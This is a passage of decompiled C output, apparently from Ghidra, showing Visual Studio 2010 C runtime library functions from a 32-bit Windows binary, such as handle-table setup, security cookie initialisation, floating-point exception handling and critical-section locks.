  pvVar1 = __calloc_crt(0x20,0x40);
  if (pvVar1 == (void *)0x0) {
    iVar2 = -1;
  }
  else {
    DAT_0041eaa8 = 0x20;
    DAT_0041eac0 = pvVar1;
    if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
      iVar2 = (int)pvVar1 + 5;
      do {
        *(undefined4 *)(iVar2 + -5) = 0xffffffff;
        *(undefined2 *)(iVar2 + -1) = 0xa00;
        *(undefined4 *)(iVar2 + 3) = 0;
        *(undefined2 *)(iVar2 + 0x1f) = 0xa00;
        *(undefined1 *)(iVar2 + 0x21) = 10;
        *(undefined4 *)(iVar2 + 0x33) = 0;
        *(undefined1 *)(iVar2 + 0x2f) = 0;
        uVar10 = iVar2 + 0x3b;
        iVar2 = iVar2 + 0x40;
      } while (uVar10 < (int)DAT_0041eac0 + 0x800U);
    }
    if ((local_50.cbReserved2 != 0) && ((UINT *)local_50.lpReserved2 != (UINT *)0x0)) {
      UVar6 = *(UINT *)local_50.lpReserved2;
      local_8 = (UINT *)((int)local_50.lpReserved2 + 4);
      local_c = (byte *)((int)local_8 + UVar6);
      if (0x7ff < (int)UVar6) {
        UVar6 = 0x800;
      }
      UVar7 = UVar6;
      if ((int)DAT_0041eaa8 < (int)UVar6) {
        piVar9 = &DAT_0041eac4;
        do {
          pvVar1 = __calloc_crt(0x20,0x40);
          UVar7 = DAT_0041eaa8;
          if (pvVar1 == (void *)0x0) break;
          DAT_0041eaa8 = DAT_0041eaa8 + 0x20;
          *piVar9 = (int)pvVar1;
          if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
            iVar2 = (int)pvVar1 + 5;
            do {
              *(undefined4 *)(iVar2 + -5) = 0xffffffff;
              *(undefined4 *)(iVar2 + 3) = 0;
              *(byte *)(iVar2 + 0x1f) = *(byte *)(iVar2 + 0x1f) & 0x80;
              *(undefined4 *)(iVar2 + 0x33) = 0;
              *(undefined2 *)(iVar2 + -1) = 0xa00;
              *(undefined2 *)(iVar2 + 0x20) = 0xa0a;
              *(undefined1 *)(iVar2 + 0x2f) = 0;
              uVar10 = iVar2 + 0x3b;
              iVar2 = iVar2 + 0x40;
            } while (uVar10 < *piVar9 + 0x800U);
          }
          piVar9 = piVar9 + 1;
          UVar7 = UVar6;
        } while ((int)DAT_0041eaa8 < (int)UVar6);
      }
      uVar10 = 0;
      if (0 < (int)UVar7) {
        do {
          pvVar5 = *(HANDLE *)local_c;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*local_8 & 1) != 0)) &&
             (((*local_8 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            puVar8 = (undefined4 *)((uVar10 & 0x1f) * 0x40 + (int)(&DAT_0041eac0)[(int)uVar10 >> 5])
            ;
            *puVar8 = *(undefined4 *)local_c;
            *(byte *)(puVar8 + 1) = (byte)*local_8;
            BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(puVar8 + 3),4000);
            if (BVar4 == 0) {
              return -1;
            }
            puVar8[2] = puVar8[2] + 1;
          }
          local_c = local_c + 4;
          uVar10 = uVar10 + 1;
          local_8 = (UINT *)((int)local_8 + 1);
        } while ((int)uVar10 < (int)UVar7);
      }
    }
    iVar2 = 0;
    do {
      piVar9 = (int *)(iVar2 * 0x40 + (int)DAT_0041eac0);
      if ((*piVar9 == -1) || (*piVar9 == -2)) {
        *(undefined1 *)(piVar9 + 1) = 0x81;
        if (iVar2 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar2 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 0x40;
          *piVar9 = -2;
        }
        else {
          *piVar9 = (int)pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 8;
          }
          BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(piVar9 + 3),4000);
          if (BVar4 == 0) {
            return -1;
          }
          piVar9[2] = piVar9[2] + 1;
        }
      }
      else {
        *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 0x80;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 3);
    SetHandleCount(DAT_0041eaa8);
    iVar2 = 0;
  }
  return iVar2;
}



/* Function: __RTC_Initialize */

/* WARNING: Removing unreachable block (ram,0x0040b54f) */
/* WARNING: Removing unreachable block (ram,0x0040b555) */
/* WARNING: Removing unreachable block (ram,0x0040b557) */
/* Library Function - Single Match
    __RTC_Initialize
   
   Library: Visual Studio 2010 Release */

void __RTC_Initialize(void)

{
  return;
}



/* Function: ___security_init_cookie */

/* Library Function - Single Match
    ___security_init_cookie
   
   Library: Visual Studio 2010 Release */

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_004191b4 == 0xbb40e64e) || ((DAT_004191b4 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_004191b4 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_004191b4 == 0xbb40e64e) {
      DAT_004191b4 = 0xbb40e64f;
    }
    else if ((DAT_004191b4 & 0xffff0000) == 0) {
      DAT_004191b4 = DAT_004191b4 | (DAT_004191b4 | 0x4711) << 0x10;
    }
    DAT_004191b8 = ~DAT_004191b4;
  }
  else {
    DAT_004191b8 = ~DAT_004191b4;
  }
  return;
}



/* Function: FUN_0040b622 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0040b622(void)

{
  _DAT_0041eaa4 = 0;
  return;
}



/* Function: FUN_0040b62a */

undefined4 FUN_0040b62a(void)

{
  return 0;
}



/* Function: __cfltcvt_init */

/* Library Function - Single Match
    __cfltcvt_init
   
   Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release */

void __cfltcvt_init(void)

{
  PTR_LAB_00419470 = __cfltcvt;
  PTR_LAB_00419474 = __cropzeros;
  PTR_LAB_00419478 = __fassign;
  PTR_LAB_0041947c = __forcdecpt;
  PTR_LAB_00419480 = __positive;
  PTR_LAB_00419484 = __cfltcvt;
  PTR_LAB_00419488 = __cfltcvt_l;
  PTR_LAB_0041948c = __fassign_l;
  PTR_LAB_00419490 = __cropzeros_l;
  PTR_LAB_00419494 = __forcdecpt_l;
  return;
}



/* Function: __fpmath */

/* Library Function - Single Match
    __fpmath
   
   Library: Visual Studio 2010 Release */

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



/* Function: __raise_exc_ex */

/* Library Function - Single Match
    __raise_exc_ex
   
   Library: Visual Studio 2010 Release */

void __cdecl
__raise_exc_ex(uint *param_1,uint *param_2,uint param_3,int param_4,uint *param_5,uint *param_6,
              int param_7)

{
  uint *puVar1;
  uint *puVar2;
  uint uVar3;
  
  uVar3 = param_3;
  puVar1 = param_2;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  if ((param_3 & 0x10) != 0) {
    param_1[1] = param_1[1] | 1;
    param_3 = 0xc000008f;
  }
  if ((uVar3 & 2) != 0) {
    param_1[1] = param_1[1] | 2;
    param_3 = 0xc0000093;
  }
  if ((uVar3 & 1) != 0) {
    param_1[1] = param_1[1] | 4;
    param_3 = 0xc0000091;
  }
  if ((uVar3 & 4) != 0) {
    param_1[1] = param_1[1] | 8;
    param_3 = 0xc000008e;
  }
  if ((uVar3 & 8) != 0) {
    param_1[1] = param_1[1] | 0x10;
    param_3 = 0xc0000090;
  }
  param_1[2] = param_1[2] ^ (~(*param_2 << 4) ^ param_1[2]) & 0x10;
  param_1[2] = param_1[2] ^ (~(*param_2 * 2) ^ param_1[2]) & 8;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 1) ^ param_1[2]) & 4;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 3) ^ param_1[2]) & 2;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 5) ^ param_1[2]) & 1;
  uVar3 = __statfp();
  puVar2 = param_6;
  if ((uVar3 & 1) != 0) {
    param_1[3] = param_1[3] | 0x10;
  }
  if ((uVar3 & 4) != 0) {
    param_1[3] = param_1[3] | 8;
  }
  if ((uVar3 & 8) != 0) {
    param_1[3] = param_1[3] | 4;
  }
  if ((uVar3 & 0x10) != 0) {
    param_1[3] = param_1[3] | 2;
  }
  if ((uVar3 & 0x20) != 0) {
    param_1[3] = param_1[3] | 1;
  }
  uVar3 = *puVar1 & 0xc00;
  if (uVar3 == 0) {
    *param_1 = *param_1 & 0xfffffffc;
  }
  else {
    if (uVar3 == 0x400) {
      uVar3 = *param_1 & 0xfffffffd | 1;
    }
    else {
      if (uVar3 != 0x800) {
        if (uVar3 == 0xc00) {
          *param_1 = *param_1 | 3;
        }
        goto LAB_0040b805;
      }
      uVar3 = *param_1 & 0xfffffffe | 2;
    }
    *param_1 = uVar3;
  }
LAB_0040b805:
  uVar3 = *puVar1 & 0x300;
  if (uVar3 == 0) {
    uVar3 = *param_1 & 0xffffffeb | 8;
LAB_0040b83b:
    *param_1 = uVar3;
  }
  else {
    if (uVar3 == 0x200) {
      uVar3 = *param_1 & 0xffffffe7 | 4;
      goto LAB_0040b83b;
    }
    if (uVar3 == 0x300) {
      *param_1 = *param_1 & 0xffffffe3;
    }
  }
  *param_1 = *param_1 ^ (param_4 << 5 ^ *param_1) & 0x1ffe0;
  param_1[8] = param_1[8] | 1;
  if (param_7 == 0) {
    param_1[8] = param_1[8] & 0xffffffe3 | 2;
    *(undefined8 *)(param_1 + 4) = *(undefined8 *)param_5;
    param_1[0x18] = param_1[0x18] | 1;
    param_1[0x18] = param_1[0x18] & 0xffffffe3 | 2;
    *(undefined8 *)(param_1 + 0x14) = *(undefined8 *)param_6;
  }
  else {
    param_1[8] = param_1[8] & 0xffffffe1;
    param_1[4] = *param_5;
    param_1[0x18] = param_1[0x18] | 1;
    param_1[0x18] = param_1[0x18] & 0xffffffe1;
    param_1[0x14] = *param_6;
  }
  __clrfp();
  RaiseException(param_3,0,1,(ULONG_PTR *)&param_1);
  if ((param_1[2] & 0x10) != 0) {
    *puVar1 = *puVar1 & 0xfffffffe;
  }
  if ((param_1[2] & 8) != 0) {
    *puVar1 = *puVar1 & 0xfffffffb;
  }
  if ((param_1[2] & 4) != 0) {
    *puVar1 = *puVar1 & 0xfffffff7;
  }
  if ((param_1[2] & 2) != 0) {
    *puVar1 = *puVar1 & 0xffffffef;
  }
  if ((param_1[2] & 1) != 0) {
    *puVar1 = *puVar1 & 0xffffffdf;
  }
  uVar3 = *param_1 & 3;
  if (uVar3 == 0) {
    *puVar1 = *puVar1 & 0xfffff3ff;
  }
  else {
    if (uVar3 == 1) {
      uVar3 = *puVar1 & 0xfffff7ff | 0x400;
    }
    else {
      if (uVar3 != 2) {
        if (uVar3 == 3) {
          *puVar1 = *puVar1 | 0xc00;
        }
        goto LAB_0040b940;
      }
      uVar3 = *puVar1 & 0xfffffbff | 0x800;
    }
    *puVar1 = uVar3;
  }
LAB_0040b940:
  uVar3 = *param_1 >> 2 & 7;
  if (uVar3 == 0) {
    uVar3 = *puVar1 & 0xfffff3ff | 0x300;
  }
  else {
    if (uVar3 != 1) {
      if (uVar3 == 2) {
        *puVar1 = *puVar1 & 0xfffff3ff;
      }
      goto LAB_0040b96c;
    }
    uVar3 = *puVar1 & 0xfffff3ff | 0x200;
  }
  *puVar1 = uVar3;
LAB_0040b96c:
  if (param_7 == 0) {
    *(undefined8 *)puVar2 = *(undefined8 *)(param_1 + 0x14);
  }
  else {
    *puVar2 = param_1[0x14];
  }
  return;
}



/* Function: __handle_exc */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __handle_exc
   
   Library: Visual Studio 2010 Release */

bool __cdecl __handle_exc(uint param_1,double *param_2,uint param_3)

{
  double dVar1;
  double dVar2;
  bool bVar3;
  double dVar4;
  uint uVar5;
  bool bVar6;
  float10 fVar7;
  uint local_18;
  byte bStack_14;
  undefined1 uStack_13;
  ushort uStack_12;
  int local_c;
  uint local_8;
  
  uVar5 = param_1 & 0x1f;
  bVar3 = true;
  local_8 = uVar5;
  if (((param_1 & 8) != 0) && ((param_3 & 1) != 0)) {
    FUN_0040bf3c();
    uVar5 = param_1 & 0x17;
    goto LAB_0040bb44;
  }
  if (((param_1 & 4) != 0) && ((param_3 & 4) != 0)) {
    FUN_0040bf3c();
    uVar5 = param_1 & 0x1b;
    goto LAB_0040bb44;
  }
  if (((param_1 & 1) == 0) || ((param_3 & 8) == 0)) {
    if (((param_1 & 2) == 0) || ((param_3 & 0x10) == 0)) goto LAB_0040bb44;
    bVar6 = (param_1 & 0x10) != 0;
    if (*param_2 != 0.0) {
      fVar7 = (float10)FUN_0040be2d(SUB84(*param_2,0),(uint)((ulonglong)*param_2 >> 0x20),&local_c);
      dVar2 = (double)fVar7;
      local_18 = SUB84(dVar2,0);
      bStack_14 = (byte)((ulonglong)dVar2 >> 0x20);
      uStack_13 = (undefined1)((ulonglong)dVar2 >> 0x28);
      uStack_12 = (ushort)((ulonglong)dVar2 >> 0x30);
      local_c = local_c + -0x600;
      if (local_c < -0x432) {
        dVar2 = dVar2 * _DAT_00416078;
        bVar6 = bVar3;
LAB_0040bb24:
        local_18 = SUB84(dVar2,0);
        bStack_14 = (byte)((ulonglong)dVar2 >> 0x20);
        uStack_13 = (undefined1)((ulonglong)dVar2 >> 0x28);
        uStack_12 = (ushort)((ulonglong)dVar2 >> 0x30);
      }
      else {
        uStack_12 = uStack_12 & 0xf | 0x10;
        if (local_c < -0x3fd) {
          local_c = -0x3fd - local_c;
          do {
            if (((local_18 & 1) != 0) && (!bVar6)) {
              bVar6 = bVar3;
            }
            local_18 = local_18 >> 1;
            if ((bStack_14 & 1) != 0) {
              local_18 = local_18 | 0x80000000;
            }
            uVar5 = CONCAT22(uStack_12,CONCAT11(uStack_13,bStack_14)) >> 1;
            bStack_14 = (byte)uVar5;
            uStack_13 = (undefined1)(uVar5 >> 8);
            uStack_12 = uStack_12 >> 1;
            local_c = local_c + -1;
          } while (local_c != 0);
        }
        if (dVar2 < 0.0) {
          dVar2 = -(double)CONCAT26(uStack_12,CONCAT15(uStack_13,CONCAT14(bStack_14,local_18)));
          goto LAB_0040bb24;
        }
      }
      *param_2 = (double)CONCAT26(uStack_12,CONCAT15(uStack_13,CONCAT14(bStack_14,local_18)));
      bVar3 = bVar6;
    }
    if (bVar3) {
      FUN_0040bf3c();
    }
    uVar5 = local_8 & 0xfffffffd;
    local_8 = uVar5;
    goto LAB_0040bb44;
  }
  FUN_0040bf3c();
  uVar5 = param_3 & 0xc00;
  dVar2 = _DAT_00419308;
  dVar4 = _DAT_00419308;
  if (uVar5 == 0) {
    dVar1 = *param_2;
joined_r0x0040ba26:
    if (dVar1 <= 0.0) {
      dVar2 = -dVar4;
    }
    *param_2 = dVar2;
  }
  else {
    if (uVar5 == 0x400) {
      dVar1 = *param_2;
      dVar2 = _DAT_00419318;
      goto joined_r0x0040ba26;
    }
    dVar4 = _DAT_00419318;
    if (uVar5 == 0x800) {
      dVar1 = *param_2;
      goto joined_r0x0040ba26;
    }
    if (uVar5 == 0xc00) {
      dVar1 = *param_2;
      dVar2 = _DAT_00419318;
      goto joined_r0x0040ba26;
    }
  }
  uVar5 = param_1 & 0x1e;
LAB_0040bb44:
  if (((param_1 & 0x10) != 0) && ((param_3 & 0x20) != 0)) {
    FUN_0040bf3c();
    uVar5 = uVar5 & 0xffffffef;
  }
  return uVar5 == 0;
}



/* Function: __set_errno_from_matherr */

/* Library Function - Single Match
    __set_errno_from_matherr
   
   Library: Visual Studio 2010 Release */

void __cdecl __set_errno_from_matherr(int param_1)

{
  int *piVar1;
  
  if (param_1 == 1) {
    piVar1 = __errno();
    *piVar1 = 0x21;
  }
  else if ((1 < param_1) && (param_1 < 4)) {
    piVar1 = __errno();
    *piVar1 = 0x22;
    return;
  }
  return;
}



/* Function: __errcode */

/* Library Function - Single Match
    __errcode
   
   Library: Visual Studio 2010 Release */

char __cdecl __errcode(byte param_1)

{
  char cVar1;
  
  if ((param_1 & 0x20) == 0) {
    if ((param_1 & 8) != 0) {
      return '\x01';
    }
    if ((param_1 & 4) == 0) {
      if ((param_1 & 1) == 0) {
        return (param_1 & 2) * '\x02';
      }
      cVar1 = '\x03';
    }
    else {
      cVar1 = '\x02';
    }
  }
  else {
    cVar1 = '\x05';
  }
  return cVar1;
}



/* Function: __umatherr */

/* Library Function - Single Match
    __umatherr
   
   Library: Visual Studio 2010 Release */

float10 __cdecl __umatherr(int param_1,int param_2)

{
  int iVar1;
  undefined4 in_stack_0000001c;
  undefined4 in_stack_00000020;
  
  iVar1 = 0;
  do {
    if ((&DAT_00419220)[iVar1 * 2] == param_2) {
      iVar1 = *(int *)(iVar1 * 8 + 0x419224);
      goto LAB_0040bbe5;
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 0x1d);
  iVar1 = 0;
LAB_0040bbe5:
  if (iVar1 != 0) {
    __ctrlfp();
    iVar1 = FUN_0040b62a();
    if (iVar1 == 0) {
      __set_errno_from_matherr(param_1);
    }
    return (float10)(double)CONCAT44(in_stack_00000020,in_stack_0000001c);
  }
  __ctrlfp();
  __set_errno_from_matherr(param_1);
  return (float10)(double)CONCAT44(in_stack_00000020,in_stack_0000001c);
}



/* Function: __handle_qnan1 */

/* Library Function - Single Match
    __handle_qnan1
   
   Library: Visual Studio 2010 Release */

float10 __cdecl __handle_qnan1(int param_1,double param_2)

{
  int *piVar1;
  float10 fVar2;
  
  if (DAT_00419210 == 0) {
    fVar2 = __umatherr(1,param_1);
    return fVar2;
  }
  piVar1 = __errno();
  *piVar1 = 0x21;
  __ctrlfp();
  return (float10)param_2;
}



/* Function: __except1 */

/* Library Function - Single Match
    __except1
   
   Library: Visual Studio 2010 Release */

void __cdecl __except1(uint param_1,int param_2,undefined8 param_3,double param_4,uint param_5)

{
  bool bVar1;
  char cVar2;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  uint local_90 [16];
  uint local_50;
  uint local_14;
  int iVar3;
  
  local_14 = DAT_004191b4 ^ (uint)&stack0xfffffff0;
  bVar1 = __handle_exc(param_1,&param_4,param_5);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    local_50 = local_50 & 0xfffffffe;
    __raise_exc_ex(local_90,&param_5,param_1,param_2,(uint *)&param_3,(uint *)&param_4,0);
  }
  cVar2 = __errcode((byte)param_1);
  iVar3 = CONCAT31(extraout_var_00,cVar2);
  if ((DAT_00419210 == 0) && (iVar3 != 0)) {
    __umatherr(iVar3,param_2);
  }
  else {
    __set_errno_from_matherr(iVar3);
    __ctrlfp();
  }
  __security_check_cookie(local_14 ^ (uint)&stack0xfffffff0);
  return;
}



/* Function: __frnd */

/* Library Function - Single Match
    __frnd
   
   Library: Visual Studio 2010 Release */

float10 __cdecl __frnd(double param_1)

{
  return (float10)ROUND(param_1);
}



/* Function: __set_exp */

/* Library Function - Single Match
    __set_exp
   
   Library: Visual Studio 2010 Release */

float10 __cdecl __set_exp(undefined8 param_1,short param_2)

{
  undefined8 local_c;
  
  local_c = (double)CONCAT26((param_2 + 0x3fe) * 0x10 | param_1._6_2_ & 0x800f,(int6)param_1);
  return (float10)local_c;
}



/* Function: __sptype */

/* Library Function - Single Match
    __sptype
   
   Library: Visual Studio 2010 Release */

undefined4 __cdecl __sptype(int param_1,uint param_2)

{
  undefined4 uVar1;
  
  if (param_2 == 0x7ff00000) {
    if (param_1 == 0) {
      return 1;
    }
  }
  else if ((param_2 == 0xfff00000) && (param_1 == 0)) {
    return 2;
  }
  if ((param_2._2_2_ & 0x7ff8) == 0x7ff8) {
    uVar1 = 3;
  }
  else {
    if (((param_2._2_2_ & 0x7ff8) != 0x7ff0) || (((param_2 & 0x7ffff) == 0 && (param_1 == 0)))) {
      return 0;
    }
    uVar1 = 4;
  }
  return uVar1;
}



/* Function: FUN_0040be2d */

void __cdecl FUN_0040be2d(uint param_1,uint param_2,int *param_3)

{
  ushort uVar1;
  bool bVar2;
  int iVar3;
  int extraout_EDX;
  
  if ((double)CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1))) ==
      0.0) {
    iVar3 = 0;
  }
  else if (((param_2 & 0x7ff00000) == 0) && (((param_2 & 0xfffff) != 0 || (param_1 != 0)))) {
    if (0.0 <= (double)CONCAT17(param_2._3_1_,
                                CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1)))) {
      bVar2 = false;
    }
    else {
      bVar2 = true;
    }
    while ((param_2._2_1_ & 0x10) == 0) {
      iVar3 = CONCAT13(param_2._3_1_,CONCAT12(param_2._2_1_,(ushort)param_2)) << 1;
      param_2._0_2_ = (ushort)iVar3;
      param_2._2_1_ = (byte)((uint)iVar3 >> 0x10);
      param_2._3_1_ = (byte)((uint)iVar3 >> 0x18);
      if ((param_1 & 0x80000000) != 0) {
        param_2._0_2_ = (ushort)param_2 | 1;
      }
      param_1 = param_1 << 1;
    }
    uVar1 = CONCAT11(param_2._3_1_,param_2._2_1_) & 0xffef;
    param_2._2_1_ = (byte)uVar1;
    param_2._3_1_ = (byte)(uVar1 >> 8);
    if (bVar2) {
      param_2._3_1_ = param_2._3_1_ | 0x80;
    }
    __set_exp(CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1))),0);
    iVar3 = extraout_EDX;
  }
  else {
    __set_exp(CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1))),0);
    iVar3 = (param_2 >> 0x14 & 0x7ff) - 0x3fe;
  }
  *param_3 = iVar3;
  return;
}



/* Function: __statfp */

/* Library Function - Single Match
    __statfp
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __statfp(void)

{
  short in_FPUStatusWord;
  
  return (int)in_FPUStatusWord;
}



/* Function: __clrfp */

/* Library Function - Single Match
    __clrfp
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __clrfp(void)

{
  short in_FPUStatusWord;
  
  return (int)in_FPUStatusWord;
}



/* Function: __ctrlfp */

/* Library Function - Single Match
    __ctrlfp
   
   Library: Visual Studio 2010 Release */

int __ctrlfp(void)

{
  short in_FPUControlWord;
  
  return (int)in_FPUControlWord;
}



/* Function: FUN_0040bf3c */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0040bf3c(void)

{
  return;
}



/* Function: ___set_fpsr_sse2 */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___set_fpsr_sse2
   
   Library: Visual Studio 2010 Release */

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_0041ebdc != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_00419348 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}



/* Function: __mtinitlocks */

/* Library Function - Single Match
    __mtinitlocks
   
   Library: Visual Studio 2010 Release */

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  undefined *puVar3;
  
  iVar2 = 0;
  puVar3 = &DAT_0041b760;
  do {
    if ((&DAT_00419354)[iVar2 * 2] == 1) {
      (&DAT_00419350)[iVar2 * 2] = puVar3;
      puVar3 = puVar3 + 0x18;
      BVar1 = InitializeCriticalSectionAndSpinCount
                        ((LPCRITICAL_SECTION)(&DAT_00419350)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_00419350)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



/* Function: __mtdeletelocks */

/* Library Function - Single Match
    __mtdeletelocks
   
   Library: Visual Studio 2010 Release */

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  undefined4 *puVar1;
  
  puVar1 = &DAT_00419350;
  do {
    lpCriticalSection = (LPCRITICAL_SECTION)*puVar1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (puVar1[1] != 1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *puVar1 = 0;
    }
    puVar1 = puVar1 + 2;
  } while ((int)puVar1 < 0x419470);
  puVar1 = &DAT_00419350;
  do {
    if (((LPCRITICAL_SECTION)*puVar1 != (LPCRITICAL_SECTION)0x0) && (puVar1[1] == 1)) {
      DeleteCriticalSection((LPCRITICAL_SECTION)*puVar1);
    }
    puVar1 = puVar1 + 2;
  } while ((int)puVar1 < 0x419470);
  return;
}



/* Function: FUN_0040c0a7 */

void __cdecl FUN_0040c0a7(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00419350)[param_1 * 2]);
  return;
}



/* Function: __mtinitlocknum */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __mtinitlocknum
   
   Library: Visual Studio 2010 Release */

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION lpCriticalSection;
  int *piVar1;
  BOOL BVar2;
  int iVar3;
  int local_20;
  
  iVar3 = 1;
  local_20 = 1;
  if (DAT_0041aeb8 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  piVar1 = &DAT_00419350 + _LockNum * 2;
  if (*piVar1 == 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      piVar1 = __errno();
      *piVar1 = 0xc;
      iVar3 = 0;
    }
    else {
      __lock(10);
      if (*piVar1 == 0) {
        BVar2 = InitializeCriticalSectionAndSpinCount(lpCriticalSection,4000);
        if (BVar2 == 0) {
          _free(lpCriticalSection);
          piVar1 = __errno();
          *piVar1 = 0xc;
          local_20 = 0;
        }
        else {
          *piVar1 = (int)lpCriticalSection;
        }
      }
      else {
        _free(lpCriticalSection);
      }
      FUN_0040c177();
      iVar3 = local_20;
    }
  }
  return iVar3;
}



/* Function: FUN_0040c177 */

void FUN_0040c177(void)

{
  FUN_0040c0a7(10);
  return;
}



/* Function: __lock */

/* Library Function - Single Match
    __lock
   
   Library: Visual Studio 2010 Release */

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((&DAT_00419350)[_File * 2] == 0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00419350)[_File * 2]);
  return;
}



/* Function: __local_unwind4 */

/* Library Function - Single Match
    __local_unwind4
   
   Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
   Studio 2019 Release */

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined1 *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040c250;
  pvStack_28 = ExceptionList;
  local_20 = DAT_004191b4 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_0040f544();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



/* Function: FUN_0040c296 */

void FUN_0040c296(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



/* Function: _EH4_CallFilterFunc */

/* Library Function - Single Match
    @_EH4_CallFilterFunc@8
   
   Library: Visual Studio 2010 Release
   __fastcall _EH4_CallFilterFunc,8 */

void __fastcall _EH4_CallFilterFunc(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



/* Function: _EH4_TransferToHandler */

/* Library Function - Single Match
    @_EH4_TransferToHandler@8
   
   Library: Visual Studio 2010 Release
   __fastcall _EH4_TransferToHandler,8 */

void __fastcall _EH4_TransferToHandler(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    /* WARNING: Could not recover jumptable at 0x0040c2e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
